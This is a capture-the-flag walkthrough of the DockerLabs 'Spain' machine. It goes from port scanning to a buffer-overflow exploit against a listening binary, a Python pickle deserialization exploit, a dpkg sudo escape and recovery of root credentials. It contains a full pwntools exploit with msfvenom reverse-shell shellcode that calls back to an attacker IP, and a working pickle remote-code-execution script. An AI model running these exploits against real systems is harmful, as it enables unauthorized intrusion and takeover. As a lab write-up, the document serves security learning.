![Screenshot](/hard/Spain/Images/machine.png)

Difficulty: **Hard**

Made by: **darksblack**

# Steps to pwn 🥽

* 👁️  [Reconnaissance](#reconnaissance)
* 🔍 [Enumeration](#enumeration)
* 🪓 [Exploitation](#exploitation)
* ⤵️  [Lateral Movement](#lateral-movement)
* 🚩 [Privilege Escalation](#privilege-escalation)

---

## 🛠️  Techniques: Enumeration with gobuster, analyse binary, exploit a BoF and gain access into the system, Exploit pickle library to lead RCE, change to the user darksblack with dpkg, analyse binary with ghidra and dinamic analysis with ltrace, get serial number in the code and escalate privileges with the password of root.

---

First of all we make sure the machine is up, we can check with the command **ping**.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/spain/enumeration]
└─$ ping 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.240 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.131 ms
64 bytes from 172.17.0.2: icmp_seq=3 ttl=64 time=0.128 ms
^C
--- 172.17.0.2 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2034ms
rtt min/avg/max/mdev = 0.128/0.166/0.240/0.052 ms
```

Now, we can start our **reconnaissance** phase.

---
# Reconnaissance

We always start with **nmap** to know what ports are open in the target.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/spain/enumeration]
└─$ nmap -p- -n -sS --min-rate 5000 -Pn -vv --open 172.17.0.2
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-08 15:28 -0500
Initiating ARP Ping Scan at 15:28
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 15:28, 0.10s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 15:28
Scanning 172.17.0.2 [65535 ports]
Discovered open port 80/tcp on 172.17.0.2
Discovered open port 22/tcp on 172.17.0.2
Discovered open port 9000/tcp on 172.17.0.2
Completed SYN Stealth Scan at 15:28, 2.66s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.000038s latency).
Scanned at 2026-01-08 15:28:39 -05 for 3s
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 64
80/tcp   open  http       syn-ack ttl 64
9000/tcp open  cslistener syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 3.05 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

**-p-** <- With this argument we tell to nmap to scan all the ports, starting from the port 1, to the port 65,535 port.

**-n** <- With this argument nmap are going to skip the DNS resolution, this is because sometimes in our scans this can be in some cases very slow.

**-sS** <- With this argument nmap will going to make a stealth-scan, this means that the 3-way-handshake will not be accomplished, and also make the scan slightly faster.

**--min-rate 5000** <- With this argument nmap, will send at least 5000 packages per second, making the scan even more faster.

**-Pn** <- With this argument nmap will also skip the Host discovery phase, this means that nmap will treat the machine as active and do immediately the scan.

**-vv** <- With this argument nmap will show us the discovered open ports while the scan continues, this means if nmap discover a open port immediately will report to us as the scan continues.

**--open** <- With this argument we are telling to nmap to only filter the open ports.

Once when the scan concludes, it seems that are 3 ports open:

- port 22 (ssh / Secure Shell)
- port 80 (http / Hyper-Text Transfer Protocol)
- port 9000 (???)

So let's make another scan with **nmap** to know what services and versions are running on.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/spain/enumeration]
└─$ nmap -p22,80,3000 -sCV 172.17.0.2 -oX target
```

**-p22,80,9000** <- With this argument nmap will only scan this 3 ports that we discover.

**-sCV** <- With this argument nmap will going to scan per each port his version to find some possible vulnerabilities about not updated systems, and also make a scan with some scripts that executes nmap, to find more about this ports.

**-oX target** <- With this argument we save all the output that nmap give us and save it as a xml file.

After the scan finish we got the output in a xml file, we do this to make a html page to see the information more easily and pretty to look at.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/spain/enumeration]
└─$ xsltproc target -o target.html
```

With this command we convert the xml file to a html file, now let's open it.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/spain/enumeration]
└─$ open target.html 
```

And we can see this in our browser.

![Screenshot](/hard/Spain/Images/image1.png)

We can see that the port 80 is a website, and redirect us to **spainmerides.dl** this is virtual hosting
so we need to put that domain the **/etc/hosts** file to be able to view the **website**.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/spain/enumeration]
└─$ head -n1 /etc/hosts
172.17.0.2      spainmerides.dl
```

Now we can see what technologies uses this domain with **whatweb**

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/spain/enumeration]
└─$ whatweb http://spainmerides.dl
http://spainmerides.dl [200 OK] Apache[2.4.62], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.62 (Debian)], IP[172.17.0.2], Title[Efemérides Españolas]
```

It seems that uses **apache**, but nothing else interesting.

So let's take a look with the browser.

![Screenshot](/hard/Spain/Images/image2.png)

So we can see this, this website use php, and after looking into the source code, we don't find anything interesting here.

---
# Enumeration

We can use **gobuster** to try to find possible files or directories in the website.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/spain/enumeration]
└─$ gobuster dir -u http://spainmerides.dl -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php,html,txt
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://spainmerides.dl
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 776]
/manager.php          (Status: 200) [Size: 1472]
```

**-x** <- With this argument we are telling to **gobuster** to add more extensions, like in this case we are trying to find files with the extension of **php, html, txt**.

And we find another file php, **manager.php**

So let's take a look with the browser.

![Screenshot](/hard/Spain/Images/image3.png)

We can see that we can download something, so let's get it and see what it does.

We can see that this is a binary file, a executable

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/spain/files]
└─$ file bitlock 
bitlock: ELF 32-bit LSB executable, Intel i386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=5b79b3eebf4e41a836c862279f4a5bc868c61ce7, for GNU/Linux 3.2.0, not stripped
```

This binary is architecture is 32 bits.

Okay so let's execute it and see what happen.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/spain/files]
└─$ ./bitlock 
Esperando conexiones en el puerto 9000...
```

We can see that is on listen mode in the port **9000** like on the target machine, we can try to connect to our machine in the **localhost** with **netcat**

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/spain/files]
└─$ nc localhost 9000
hello
```

I enter this text, and in the server side we can see this:

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/spain/files]
└─$ ./bitlock 
Esperando conexiones en el puerto 9000...
************************
* hello
0 *
************************
```

It seems we receive the message, so we can try to send so much data and see what happens

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/spain/files]
└─$ nc localhost 9000
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...
```

And we can see this:

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/spain/files]
└─$ ./bitlock 
Esperando conexiones en el puerto 9000...
************************
* hello
0 *
************************
************************
* AAAAAAAAAAAAAAAAAAAAAAAAAA...0 *
************************
zsh: segmentation fault  ./bitlock
```

We caused a **buffer overflow** in this script, so let's make a analysis with **gdb** and run the program once again.

---
# Exploitation

To see what happens in the script itself.

```lua
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/spain/files]
└─$ gdb -q bitlock 
GEF for linux ready, type `gef' to start, `gef config' to configure
93 commands loaded and 5 functions added for GDB 16.3 in 0.01ms using Python engine 3.13
Reading symbols from bitlock...
(No debugging symbols found in bitlock)
gef➤
```

Great so now let's run once again this binary with just **r**

```r
gef➤  r
Starting program: /home/craft/challenges/dockerlabs/dificil/spain/files/bitlock 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/x86_64-linux-gnu/libthread_db.so.1".
Esperando conexiones en el puerto 9000...
```

Okay now let's connect and enter once again a lot of data.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/spain/files]
└─$ nc localhost 9000
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...
```

![Screenshot](/hard/Spain/Images/image4.png)

We can see a lot of information here, but let's just only see the first data that is the registers, that's being indicated with the colour **red**

We can see that when we enter so much data in the buffer (buffer is like a space available of data) that we overwrite more registers like **EBP** and **EIP**

This is dangerous because we can change the flow of the program that we want to.

If you don't know what a **EIP** (Extended Instruction Pointer) is basically telling to the program what instruction needs to be executed after, is like a guide for the program.

And as we can see in the image **EIP** his value is **AAAA** (0x41414141), for the computer this address is invalid, because  doesn't exist a instruction with that address.

So if we modify the value of **EIP** we can change the flow of the program wherever we want, and lead the execution of the program to another place.

Okay so let's check what protections uses this binary with **checksec**

```r
gef➤  checksec
[+] checksec for '/home/craft/challenges/dockerlabs/dificil/spain/files/bitlock'
Canary  : ✘
NX      : ✘
PIE     : ✘
Fortify : ✘
RelRO   : Partial
```

We can see that the permission of **NX** (Not Executable) is disabled, this means that we can execute commands to the system.

So we can enter **shellcodes** in the stack to execute commands in the system.

But we need the **offset** of the **EIP** this is like a location of the EIP before **overwritting** in it.

We can use **patterns** to know the total number of bytes before writing eip.

All of these functions that I am using is a plugin of GDB, that is **gef** you can take a look in github right [here](https://github.com/hugsy/gef)

```r
gef➤  pattern create
[+] Generating a pattern of 1024 bytes (n=4)
aaaabaaacaaadaaaeaaafaaagaaahaa...                 
[+] Saved as '$_gef0'
```

Okay so let's copy all of this to the clipboard.

Then let's run once again the program to connect once again and enter all of this.

Then let's connect once again with **netcat**.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/spain/files]
└─$ nc localhost 9000
Enter data: aaaabaaacaaadaaaeaaaf...
```

And we can see this:

![Screenshot](/hard/Spain/Images/image5.png)

Looks the same but with just different strings.

And we can get the offset of EIP with the next command:

**pattern offset $eip**

```r
gef➤  pattern offset $eip
[+] Searching for '61616761'/'61676161' with period=4
[+] Found at offset 22 (little-endian search) likely
```

And we found the offset of eip that is **22**, to check it we can make a string of characters of 300 bytes and add **BBBB** to see if we can overwrite the EIP with these characters

```r
AAAAAAAAAAAAAAAAAAAAAABBBBCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
```

Then let's run once again the program and connect to enter this string.

![Screenshot](/hard/Spain/Images/image6.png)

We can see that we found the offset of eip is equal to 22, and his value is BBBB, also we can see that **ESP** (Extended Stack Pointer) is being overwritten with a lot of Cs

**ESP** is another register that points at the top of the stack (the most recently pushed item), so we can try to know where is located **ESP** with **objdump** to the binary.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/spain/files]
└─$ objdump -d bitlock | grep jmp | grep esp 
0804948b <jmp_esp>:
 804948b:       ff e4                   jmp    *%esp
```

We found the location of this instruction that is: **804948b** (0x804948b)

And for the **jmp esp** instruction this makes that the **CPU** **jumps** to the memory address to **ESP**, this is very important to know to execute commands correctly.

So after of doing all of this we can make a exploit, and use **pwntools**.

To generate the **shellcode** and make a reverse shell, we can use **msfvenom**

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/spain/files]
└─$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.0.20 LPORT=1234 -f c
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 68 bytes
Final size of c file: 311 bytes
unsigned char buf[] = 
"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd"
"\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\xc0\xa8\x00"
"\x14\x68\x02\x00\x04\xd2\x89\xe1\xb0\x66\x50\x51\x53\xb3"
"\x03\x89\xe1\xcd\x80\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f"
"\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80";
```

All that string is the **shellcode.**

So here it is the exploit made with python.

```r
from pwn import *

target = "172.17.0.2"
port = 9000

def send():
    connect = remote(target, port)

    # 0804948b

    eip_offset = 22

    esp = b"\x8b\x94\x04\x08"

    payload = b"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd"
    payload += b"\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\xc0\xa8\x00"
    payload += b"\x14\x68\x02\x00\x04\xd2\x89\xe1\xb0\x66\x50\x51\x53\xb3"
    payload += b"\x03\x89\xe1\xcd\x80\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f"
    payload += b"\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80"

    nops = b"\x90"*30

    trash = b"A"*eip_offset + esp + nops + payload

    connect.sendline(trash)

    connect.close()

if __name__ == "__main__":
    send()
```

We need to change the order of the esp because this binary is a architecture of **little-endian** and the address needs to be in backwards.

And the **NOPS** are basically a series of bytes that are **no operation** this **NOPS** are being saved in the stack, and those bytes are going to make to not immediately execute the **shellcode**, because sometimes the addresses on the memory can be affected or be a little bit different.

I'm going to make a diagram with **excalidraw** to show how it works this exploit.

![Screenshot](/hard/Spain/Images/image7.png)

Okay so let's make a **netcat** listener to receive the shell.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/spain/files]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
```

**-l**  <- This argument makes to netcat to be in listening mode.

**-v** <- This argument activates the **verbose** mode, this will show us in more detail the connection that we receive.

**-n** <- This makes to netcat to skip the DNS lookup, and only uses the IP address directly.

**-p** <- The port we are in listening, can be any, if it's not being currently used.

Now let's execute the exploit to make a **BoF** and execute arbitrary commands on the system.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/spain/exploits]
└─$ python3 exploit.py 
[+] Opening connection to 172.17.0.2 on port 9000: Done
[*] Closed connection to 172.17.0.2 port 9000
```

Now we receive this on the **netcat** listener:

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/spain/files]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [192.168.0.20] from (UNKNOWN) [172.17.0.2] 35614
whoami
www-data
```

We are in!

Now let's custom this shell to operate more comfy with this.

First of all we do this:

```r
script /dev/null -c bash
Script started, output log file is '/dev/null'.
```

This command makes a new bash session with **script** and **/dev/null** asthe output file, because script register every command we execute in a log, but with /dev/null path, we make that log can't record commands, and **-c bash** makes script to run the shell with bash.

We do this because we want to use CTRL + C and more functions of the bash.

When we execute this, we suspend our reverse shell for a moment.

then we execute the next command in our attack machine:

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/spain/files]
└─$ stty raw -echo; fg
```

This command does that stty will treat the terminal.

**raw** <- With raw we are making all the data of output and input to be as raw.

**-echo** <- With this we are making that if we execute a command it will not be printed again in the output.

**; fg** <- And with this we resume our reverse shell again.

When we execute this command we reset the xterm:

```r
reset xterm
```

This are going to reset the terminal.

If we want to clear our terminal we can't because the term it gonna be different of the xterm, that it have this function. we can do this in the next way to be able to clear our screen if it get nasty:

```r
www-data@dockerlabs:/$ export TERM=xterm
```

And one last thing, if we notice the display of the terminal is very tiny!

We can adjust this to be more bigger with the next command:

```r
www-data@dockerlabs:/$ stty rows {num} columns {num}
```

and finally it looks way better!

---
# Lateral Movement

We can change to another user because we have a privilege of SUDOER when executing **sudo -l**

```r
www-data@dockerlabs:/$ sudo -l
Matching Defaults entries for www-data on dockerlabs:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User www-data may run the following commands on dockerlabs:
    (maci) NOPASSWD: /bin/python3 /home/maci/.time_seri/time.py
```

We can execute this python script as the user **maci**, let's take a look into the code.

![Screenshot](/hard/Spain/Images/image8.png)

It seems that imports **pickle** and **os**, especially **pickle** we can escalate it to a **RCE**.

And how it works?

Is a little difficult to explain because we need to talk about how python **serialise** and **deserialise** data and how pickle works with it at low level.

If you want to know more about all of this and why pickle is a bad idea to use, you can take a look [here](https://davidhamann.de/2020/04/05/exploiting-python-pickle/)

In resume when we **serialise** data with the format pickle, is working with bytes and when we **deserialise** is like recovering once again the info, but when pickle desarialise is executing byte by byte as soon when pickle does it.

Example:

```python
>>> import pickle
>>> pickle.dumps(["pwned", 1, 2, "yayy!!"])
b'\x80\x04\x95\x1a\x00\x00\x00\x00\x00\x00\x00]\x94(\x8c\x05pwned\x94K\x01K\x02\x8c\x06yayy!!\x94e.'
```

This is like format pickle.

To deserialise it we need to load that string of bytes, and we can see that the info is recovered.

```python
>>> pickle.loads(b'\x80\x04\x95\x1a\x00\x00\x00\x00\x00\x00\x00]\x94(\x8c\x05pwned\x94K\x01K\x02\x8c\x06yayy!!\x94e.')
['pwned', 1, 2, 'yayy!!']
```


We can recover the information, and you can see why this is vulnerable, we can make a payload that instead of doing all of this we can try to import the **os** library and execute arbitrary code.

So im going to make a python script to make this all for us.

And i'm going to make a diagram of the python script that is vulnerable with **excalidraw**

![Screenshot](/hard/Spain/Images/image9.png)

I hope that you can understand it  with this diagram...

And this is the exploit of pickle:

```python
import os, pickle

file = "/opt/data.pk1"
config = "/home/maci/.time_seri/time.conf"

def execute(payload):
    class RCE:
        def __reduce__(self):
            return (os.system, (payload,))

    convert = pickle.dumps(RCE())

    with open(file, "wb") as f: f.write(convert)

    print("\n[!] Payload saved.")

    with open(config, "w") as conf: conf.write("serial=on")

    print("[i] Serial mode: ON\n[!] EXECUTING PAYLOAD")

    os.system("sudo -u maci python3 /home/maci/.time_seri/time.py")

if __name__ == "__main__":
    cmd = str(input("[*] CMD -> ")).strip()

    execute(cmd)
```

Okay so now let's execute the exploit.

```r
www-data@dockerlabs:/tmp$ python3 rce_pickle.py 
[*] CMD -> bash

[!] Payload saved.
[i] Serial mode: ON
[!] EXECUTING PAYLOAD
maci@dockerlabs:/tmp$ whoami
maci
```

Great now we are the user **maci**!

If with this user **maci**, we have a privilege of **SUDOER** when executing **sudo -l**

```r
maci@dockerlabs:/tmp$ sudo -l
Matching Defaults entries for maci on dockerlabs:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User maci may run the following commands on dockerlabs:
    (darksblack) NOPASSWD: /usr/bin/dpkg
```

We can see that we can execute the command **dpkg** as the user **darksblack** without a password.

We can execute commands with this user when executing the following command:

- **sudo -u darksblack dpkg -l**

And we can execute the command something like this: **!(command)**

```r
maci@dockerlabs:/tmp$ sudo -u darksblack dpkg -l
......
!bash
darksblack@dockerlabs:/tmp$ whoami
bash: whoami: command not found
darksblack@dockerlabs:/tmp$ id
```

And we gain access as this user **darksblack**! but we can't execute any command, let's see if we can execute the next command: id with the full path of the binary.

```r
darksblack@dockerlabs:/tmp$ /bin/id
uid=1002(darksblack) gid=1002(darksblack) groups=1002(darksblack)
```

And it works, let's see the value of our **PATH**

```r
darksblack@dockerlabs:/tmp$ echo $PATH
/home/darksblack/bin
```

We can see that the PATH is very limited so we need to define a PATH to execute commands properly, we can take the value of the PATH from the user **maci**, copying to the clipboard and enter this new value.

```r
maci@dockerlabs:/tmp$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

We copy the path and then let's move once again to the user **darksblack**

```r
darksblack@dockerlabs:/tmp$ export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
no tan rapido campeon!
```

it seems that we can't use **export** but it not problem and we can do this then:

```r
darksblack@dockerlabs:/tmp$ PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
darksblack@dockerlabs:/tmp$ id
uid=1002(darksblack) gid=1002(darksblack) groups=1002(darksblack)
```

Now we can execute any command in the system with this new path!

---
# Privilege Escalation

After a long time trying to escalate privileges, in the home directory from the user **darksblack** we see a binary.

```r
darksblack@dockerlabs:~$ ls -la
total 56
drwxr-x--- 1 darksblack darksblack  4096 Jan 10 20:43 .
drwxr-xr-x 1 root       root        4096 Dec 26  2024 ..
lrwxrwxrwx 1 root       root           9 Dec 26  2024 .bash_history -> /dev/null
-rw-r--r-- 1 root       root         220 Mar 29  2024 .bash_logout
-rw-r--r-- 1 root       root        3613 Jan  1  2025 .bashrc
drwxr-xr-x 3 darksblack darksblack  4096 Jan 10 20:42 .local
-rw-r--r-- 1 root       root         807 Mar 29  2024 .profile
-rw------- 1 darksblack darksblack   726 Jan  1  2025 .viminfo
drwxr-xr-x 2 darksblack darksblack  4096 Jan  1  2025 .zprofile
-rwxr-xr-x 1 darksblack darksblack 15048 Jan  1  2025 Olympus
drwxr-x--- 1 darksblack darksblack  4096 Jan  1  2025 bin
```

The binary is **Olympus**.

Let's execute it and see what happens.

```r
darksblack@dockerlabs:~$ ./Olympus 
Selecciona el modo:
1. Invitado
2. Administrador
2
Introduce el serial: 1234
Serial invalido, vuelve a intentar
```

So let's transfer this binary to us, using **python3** to make a server in the target machine and downloading it with **wget**.

```r
darksblack@dockerlabs:~$ python3 -m http.server 100
Serving HTTP on 0.0.0.0 port 100 (http://0.0.0.0:100/) ..
```

Now let's downloading it with **wget** from our attack machine.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/spain/files]
└─$ wget http://172.17.0.2:100/Olympus
--2026-01-10 15:58:26--  http://172.17.0.2:100/Olympus
Connecting to 172.17.0.2:100... connected.
HTTP request sent, awaiting response... 200 OK
Length: 15048 (15K) [application/octet-stream]
Saving to: ‘Olympus’

Olympus                                                     100%[================================================>]  14.70K  --.-KB/s    in 0s   

2026-01-10 15:58:26 (599 MB/s) - ‘Olympus’ saved [15048/15048]
```

Now let's analyse it with **ghidra** and doing reverse engineering.

So im going to edit the main function to understand it better.

```c

/* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */

undefined4 main(void)

{
  int real_serial;
  char return_serial [150];
  char true_serial [100];
  char examine_serial [10];
  undefined1 serial_user_input [100];
  int user_option;
  FILE *possible_serial;
  undefined1 *local_10;
  
  local_10 = &stack0x00000004;
  puts("Selecciona el modo:\n1. Invitado\n2. Administrador");
  __isoc99_scanf(&DAT_0804a039,&user_option);
  if (user_option == 2) {
    printf("Introduce el serial: ");
    __isoc99_scanf(&DAT_0804a052,serial_user_input);
                    /* Checks serial number */
    snprintf(return_serial,150,"/home/darksblack/.zprofile/OlympusValidator %s",serial_user_input);
    possible_serial = popen(return_serial,"r");
    if (possible_serial == (FILE *)0x0) {
      puts("Error al ejecutar el comando.");
      return 1;
    }
    fgets(examine_serial,10,possible_serial);
    fgets(true_serial,100,possible_serial);
    pclose(possible_serial);
    real_serial = strncmp(examine_serial,"VALIDO",6);
                    /* If the serial is valid */
    if (real_serial == 0) {
      printf("%s",true_serial);
    }
    else {
      puts("Serial invalido, vuelve a intentar");
    }
  }
  if (user_option == 1) {
    puts("Bienvenido al modo invitado, aqui podras obtener la lista de tareas pendientes.");
    puts("1. Desarrollo website empresa: Tradeway Consulting CORP");
    puts("2. Prueba de Penetracion empresa: Tradeway Consulting CORP");
    puts("3. Securizar red corporativa en Tradeway Consulting CORP");
  }
  if ((user_option != 1) && (user_option != 2)) {
    puts("Seleccion Incorrecta");
  }
  return 0;
}
```

Here we got all the C main function of the binary **Olympus**.

We can see that when we enter the serial number, it executes another executable and pass the serial number that is in this path:

- **/home/darksblack/.zprofile/OlympusValidator %s**

It seems that is a hidden directory in the home directory of the user **darksblack**, this binary is **OlympusValidator** and pass the serial number.

So let's download this hidden binary once again with **wget** from the target machine.

```r
darksblack@dockerlabs:~$ cd .zprofile/
darksblack@dockerlabs:~/.zprofile$ ls
OlympusValidator
darksblack@dockerlabs:~/.zprofile$ python3 -m http.server 100 &
Serving HTTP on 0.0.0.0 port 100 (http://0.0.0.0:100/) ...
```

Now let's download it.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/spain/files]
└─$ wget http://172.17.0.2:100/OlympusValidator
--2026-01-10 16:23:56--  http://172.17.0.2:100/OlympusValidator
Connecting to 172.17.0.2:100... connected.
HTTP request sent, awaiting response... 200 OK
Length: 14952 (15K) [application/octet-stream]
Saving to: ‘OlympusValidator’

OlympusValidator                                            100%[==================================================>]  14.60K  --.-KB/s    in 0.009s  
2026-01-10 16:23:56 (1.60 MB/s) - ‘OlympusValidator’ saved [14952/14952]
```

Now let's execute it and see what happens.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/spain/files]
└─$ ./OlympusValidator 1234
INVALIDO
```

It seems that this binary really checks if the serial number is valid, we can use **ltrace** to execute the program like as usual but see more information in low level how it works.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/spain/files]
└─$ ltrace ./OlympusValidator 1234
__libc_start_main(["./OlympusValidator", "1234"] <unfinished ...>
snprintf("A678-GHS3-OLP0-QQP1-DFMZ", 50, "%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c"..., 'A', '6', '7', '8', '-', 'G', 'H', 'S', '3', '-', 'O', 'L', 'P', '0', '-', 'Q') = 24
strcmp("1234", "A678-GHS3-OLP0-QQP1-DFMZ")                                                                                                         = -1
puts("INVALIDO"INVALIDO
)                                               = 9
+++ exited (status 0) +++
```

And here we can find the real serial number! that is:

- **A678-GHS3-OLP0-QQP1-DFMZ**

Let's introduce this in the Validator and see if it's the real one.

```c
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/spain/files]
└─$ ./OlympusValidator A678-GHS3-OLP0-QQP1-DFMZ
VALIDO
Credenciales ssh root:@#*)277280)6x4n0
```

And we got the credentials of the user **root**!

Let's see if it works.

```r
darksblack@dockerlabs:/$ su
Password: 
root@dockerlabs:/# whoami
root
```

We are root now ***...pwned..!***
